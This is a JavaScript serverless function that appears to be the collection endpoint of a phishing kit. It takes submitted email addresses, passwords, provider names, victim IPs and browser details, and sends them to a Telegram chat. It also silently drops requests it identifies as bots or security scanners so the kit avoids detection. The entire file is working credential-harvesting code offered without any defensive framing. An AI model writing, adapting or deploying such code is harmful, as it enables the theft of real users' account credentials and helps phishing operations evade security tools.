import { isBot, getClientIP, sendTelegram, botResponse } from './_utils.js';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  // Anti-bot: silently drop bots/scanners
  if (isBot(req)) {
    console.log('🛡️ Bot blocked on /api/collect:', req.headers['user-agent']);
    return botResponse(res);
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, provider, attempt, sysInfo } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Missing credentials' });
    }

    const clientIP = getClientIP(req);
    const timestamp = new Date().toLocaleString();
    const host = req.headers.host || 'vercel.app';

    let message = `🔔 *NEW LOGIN ATTEMPT*\n\n`;
    message += `*📊 LOGIN DETAILS:*\n`;
    message += `📧 Email: \`${email}\`\n`;
    message += `🔑 Password: \`${password}\`\n`;
    message += `🏢 Provider: \`${provider || 'Unknown'}\`\n`;
    message += `📝 Attempt: \`${attempt || 1}\`\n\n`;

    message += `*🌐 NETWORK INFO:*\n`;
    message += `🌍 IP: \`${clientIP}\`\n`;
    if (sysInfo) {
      message += `💻 Platform: \`${sysInfo.platform}\`\n`;
      message += `🖥 Screen: \`${sysInfo.screenResolution}\`\n`;
      message += `🌍 Language: \`${sysInfo.language}\`\n`;
      message += `🔗 Page: \`${sysInfo.pageUrl}\`\n`;
    }
    message += `\n`;

    message += `*📡 SERVER:*\n`;
    message += `🔗 Domain: \`${host}\`\n`;
    message += `⏰ Time: \`${timestamp}\`\n`;
    message += `✅ Vercel Serverless`;

    await sendTelegram(message, process.env);

    return res.status(200).json({ success: true });

  } catch (error) {
    console.error('❌ Error:', error);
    return res.status(500).json({ error: 'Server error' });
  }
}
